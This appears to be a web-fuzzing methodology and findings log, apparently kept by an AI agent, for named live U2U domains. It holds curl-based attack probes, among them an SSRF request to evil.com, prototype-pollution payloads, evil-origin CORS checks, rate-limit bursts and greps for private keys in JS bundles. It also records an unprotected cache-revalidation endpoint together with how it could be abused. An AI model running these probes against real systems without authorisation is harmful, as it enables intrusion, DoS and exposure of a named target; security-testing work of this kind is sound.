# U2U Web2 Remote Fuzzing — 8-Edge-Case Methodology (2026-08)

## Targets
- `u2u.xyz` (Next.js 14 + Prismic CMS, behind Cloudflare)
- `staking.u2u.xyz` (React CRA, 4.2MB single JS bundle)
- `bundler.u2u.xyz` (Node/TS AA Bundler v0.7.0, behind Cloudflare + AWS ALB)
- `staking-graphql.u2u.xyz` (GraphQL, introspection enabled)
- `graph.u2u.xyz` (The Graph, introspection enabled)

## The 8-Edge-Case Remote Fuzzing Methodology

This is a structured, code-free remote fuzzing pass for any Next.js/React frontend. Run all 8 categories in parallel — no source code needed.

### 1. Next.js Parameter Pollution
```bash
curl -s -o /dev/null -w "HTTP %{http_code}" -D - "https://target.xyz/?param1=val1&param1=val2"
```
- Checks if Next.js query-array handling crashes or leaks
- Next.js normally handles this gracefully (HTTP 200, no crash)

### 2. GraphQL Introspection
```bash
for url in "https://target.xyz/api/graphql" "https://api.target.xyz/graphql"; do
  curl -s -X POST -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name}}}"}' "$url"
done
```
- **Finding pattern:** introspection enabled = full schema exposure
- Also check subgraph endpoints (`graph.target.xyz`, `subgraph.target.xyz`)
- The Graph endpoints often have introspection enabled by default

### 3. Error-based Info Leak
```bash
# Trigger patterns
curl "https://target.xyz/api/__invalid__"
curl "https://target.xyz/_next/static/__invalid__"
curl "https://target.xyz/__NEXT_DATA__"
curl "https://target.xyz/api/%00"          # null byte → Cloudflare 400
curl "https://target.xyz/\\"               # backslash → 308 redirect
curl "https://target.xyz/_next/image?url=https://evil.com/&w=100&q=75"  # SSRF attempt
curl "https://target.xyz/next.config.js"    # config leak attempt
curl "https://target.xyz/_next/static/...js.map"  # sourcemap leak
```
- **Pitfall:** Cloudflare blocks null bytes with 400, not the app
- Check for `__next_error__` HTML — Next.js error pages sometimes leak route info
- `"url" parameter is not allowed` = images.remotePatterns locked (safe)

### 4. JS Bundle Secrets — Full Chunk Extraction
```bash
# Step 1: Download main page
curl -s "https://target.xyz" -o /tmp/main.html

# Step 2: Extract ALL .js URLs
grep -oP '(src|href)="(/_next/static/[^"]*\.js)"' /tmp/main.html | \
  grep -oP '/_next/static/[^"]*\.js' | sort -u > /tmp/js_urls.txt

# Step 3: Download all chunks
mkdir -p /tmp/js_chunks
while read url; do
  curl -s -o "/tmp/js_chunks/$(basename $url)" "https://target.xyz$url"
done < /tmp/js_urls.txt

# Step 4: Grep for secrets
grep -roh 'NEXT_PUBLIC_[A-Z_]+' /tmp/js_chunks/
grep -roh 'https://[a-zA-Z0-9._/-]*' /tmp/js_chunks/ | sort -u
grep -roh 'wss\?://[a-zA-Z0-9._/-]*' /tmp/js_chunks/ | sort -u
grep -o 'projectId[[:space:]:]*"[^"]*"' /tmp/js_chunks/*.js   # WalletConnect
grep -oE '0x[a-fA-F0-9]{64}' /tmp/js_chunks/*.js               # private keys
grep -o 'chainId[[:space:]:]*[0-9x]*' /tmp/js_chunks/*.js | sort -u
```

**High-value grep targets:**
| Pattern | What it finds |
|---------|---------------|
| `NEXT_PUBLIC_*` | Public env vars (safe by design, but reveals stack) |
| `projectId` + `"..."` | **WalletConnect project ID** — hardcoded = impersonation risk |
| `WALLET_CONNECT_KEY` | WalletConnect relay key |
| `https://*.target.xyz/*` | Internal infrastructure URLs (RPC, GraphQL, subgraph, report APIs) |
| `wss://*` | WebSocket endpoints (RPC nodes, relay servers) |
| `rpc.*` / `RPC_URL` | Blockchain RPC endpoints |
| `chainId` | Supported chain IDs |
| `0x[a-fA-F0-9]{64}` | Private keys (rare but catastrophic) |
| `api[_-]?key` / `apikey` | API keys in bundle |
| `sentry` / `dsn` / `DSN` | Sentry DSN (monitoring leak) |

**Key finding from U2U staking (4.2MB bundle):**
- WalletConnect project ID: `807caabcacf68376094209c3e9d946e6` (hardcoded)
- Internal URLs: `rpc-mainnet`, `rpc-devnet`, `rpc-nebulas-testnet`, `graph.u2u.xyz`, `staking-graphql.u2u.xyz`, `subgraph.u2u.xyz`, `report.u2u.xyz`
- Chain IDs: 0,1,10,100,137,11155111,130,1301,1625,169,...
- WSS: `relay.walletconnect.org`, `bob-sepolia.rpc.gobob.xyz`, `crab-rpc.darwinia.network`

### 5. Rate Limiting
```bash
# Burst test (20-50 rapid requests)
for i in $(seq 1 50); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.xyz/api/endpoint")
  [ "$code" != "200" ] && echo "Req $i: HTTP $code"
done

# Check for rate-limit headers
curl -s -o /dev/null -D - "https://target.xyz/" | grep -iE "ratelimit|retry-after|x-ratelimit|429"
```
- **Finding pattern:** No 429 responses + no `X-RateLimit-*` headers = no rate limiting
- Cloudflare `cf-ray` header doesn't mean rate limiting is active
- RPC endpoints without rate limiting = DoS vector

### 6. WebSocket Discovery
```bash
# Check common WS paths
for path in "/ws" "/socket" "/socket.io" "/_next/webpack-hmr" "/api/ws"; do
  curl -s -o /dev/null -w "HTTP %{http_code}\n" \
    -H "Upgrade: websocket" -H "Connection: Upgrade" \
    "https://target.xyz$path"
done

# Also grep from page source + JS bundles
curl -s "https://target.xyz" | grep -oP 'ws[s]?://[^"'"'"'`\s]+'
grep -roh 'wss\?://[a-zA-Z0-9._/-]*' /tmp/js_chunks/ | sort -u
```

### 7. Prototype Pollution
```bash
# POST with __proto__ injection
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true},"test":"value"}' \
  "https://target.xyz/api"

# Constructor.prototype variant
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}' \
  "https://target.xyz/api"
```
- **Pitfall:** SPA fallback 200 HTML ≠ JSON API — check Content-Type
- Most Next.js apps don't parse JSON body at `/api` root — 404 expected

### 8. CORS Misconfiguration
```bash
# Preflight from evil origin
curl -s -o /dev/null -D - -X OPTIONS \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  "https://target.xyz/api" | grep -iE "access-control|allow"

# Null origin test
curl -s -o /dev/null -D - -X OPTIONS \
  -H "Origin: null" "https://target.xyz/api"

# Credentials + wildcard = INVALID config
curl -s -o /dev/null -D - \
  -H "Origin: https://evil.com" -H "Cookie: test=1" \
  "https://target.xyz/api"
```
- **CRITICAL pattern:** `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` = invalid per spec, browser rejects, but indicates serious misconfig (credential theft via DNS rebinding)
- `Access-Control-Allow-Origin: *` without credentials = safer but still permissive

## Bundler-specific: ERC-4337 RPC Probe
```bash
# Chain ID
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}' \
  "https://bundler.target.xyz/rpc"

# Enumerate methods
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"rpc_modules","params":[],"id":1}' \
  "https://bundler.target.xyz/rpc"

# Attempt debug methods
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"debug_traceTransaction","params":["0x00..."],"id":1}' \
  "https://bundler.target.xyz/rpc"
```
- `-32601` "Method not supported" = method doesn't exist → BLOCKED
- `-32602` "missing value" = method exists but needs args → finding
- Returned `result` = method working → critical finding

## Quick Reference: Severity Heuristics

| Finding | Severity | Rationale |
|---------|----------|-----------|
| Next.js ISR revalidation without secret | 🔴 CRITICAL | Cache poisoning, DoS, draft content leak |
| WalletConnect project ID hardcoded in JS | 🔴 HIGH | Impersonation, phishing |
| CORS `*` + `credentials: true` | 🔴 HIGH | Credential theft surface |
| GraphQL introspection enabled | 🟠 MEDIUM | Full schema exposure |
| No rate limiting on RPC | 🟠 MEDIUM | DoS vector |
| ERC-4337 bundler functional (pre-auth) | 🟠 MEDIUM | UserOp submission + entry point enumeration |
| Internal URLs in JS bundle | 🟡 LOW | Recon aid, not exploitable alone |
| `NEXT_PUBLIC_*` env vars | 🟢 LOW | Public by design |
| 4.2MB+ JS bundle | 🟡 LOW | Performance + recon surface |
| Sourcemaps 404 | 🟢 LOW | Safe |

## CDC Agent 1 (ARCHITECT) Pass — 2026-08-14

Full CDC Agent 1 pass on U2U Web2 (no source, remote-only):

### Next.js ISR Revalidation — UNPROTECTED (CRITICAL)
```
POST /api/revalidate HTTP/2
{"secret": "***","path":"/"}
→ 200 {"revalidated":true,"now":1786683111979}
```
Any secret string works — no validation. Combined with `/api/preview` (307 → sets `__prerender_bypass` cookie), attacker can: (a) poison ISR cache, (b) DoS via continuous revalidation, (c) leak draft/Prismic preview content.

### Next.js Server Actions — ZERO (BLOCKED)
No `$ACTION_ID` in any chunk. No `createActionProxy`, `createServerReference`, or form `action=` attributes. u2u.xyz is pure content site (Prismic CMS), no user input → no Server Action attack surface.

### u2u.xyz Auth — NONE
No NextAuth (`/api/auth/*` all 404), no SIWE, no JWT, no session cookies. Only `__prerender_bypass` cookie for Prismic preview mode.

### staking.u2u.xyz Auth — WALLET-BASED
WalletConnect v2 + wagmi + RainbowKit + Reown AppKit. Project ID: `807caabcacf68376094209c3e9d946e6` (hardcoded in bundle). Social auth: Google, Github, Apple, Facebook, X, Discord, Farcaster. SIWE pattern detected (`signMessage` → JWT → GraphQL).

### bundler.u2u.xyz — ERC-4337 AA Bundler v0.7.0
- Root: `"Account-Abstraction Bundler v.0.7.0. please use /rpc"`
- EntryPoint: `0xdbd3939BeeC5DC02Df4820212820cB078d95DD32`
- Client: `aa-bundler/0.7.0/unsafe`
- Chain ID: `0x27` (39)
- `eth_sendUserOperation` functional — returns proper gas validation errors (not generic)
- AWS ALB behind Cloudflare (AWSALB sticky session cookies)

### report.u2u.xyz — Go API
- `/api/circulating` → `{"supply":8356001269}` (8.36B U2U)
- `/api/u2u_price` — price endpoint (timeout during probe, may need params)
- CSP: `default-src 'none'`
- CORS: `*` with all methods

### GraphQL / Subgraph Endpoints
- `staking-graphql.u2u.xyz/graphql` — `calculateApr` query only, AWS ALB
- `graph.u2u.xyz/subgraphs/name/u2u/sfc-network-v3` — full schema: epochs, validators, epochCounters, validatorCounters, pointers
- `graph.u2u.xyz/subgraphs/name/u2u/sfc-subgraph-v3` — same class
- `subgraph.u2u.xyz/subgraphs/name/u2u/sfc-network` — same class
- All with introspection enabled, no mutations, CORS `*`

### RPC Endpoints
- `rpc-mainnet.u2u.xyz` — active, chainId 39, `net_version` 39
- `rpc-devnet.u2u.xyz` — timeout (unreachable)
- `rpc-nebulas-testnet.u2u.xyz` — CF error 1016 (DNS)

### Admin Panel Probe — ALL 404
/admin, /dashboard, /console, /wp-admin, /panel, /cms, /login, /signin, /auth, /account, /profile, /settings — all 404 on all subdomains.

### CORS Summary
| Target | CORS | Credentials |
|--------|------|-------------|
| u2u.xyz | `*` | true |
| report.u2u.xyz | `*` | false |
| bundler.u2u.xyz | `*` | false |
| staking-graphql | `*` | false |

## Report Format
Output as a table: `# | Edge Case | Target | Hasil | Severity` with emoji indicators (🔴🟠🟡🟢). Use casual tone — no AI slop, no dashes, no bullet-point walls. Each finding gets one row with concrete evidence (HTTP code, response preview, exact header value).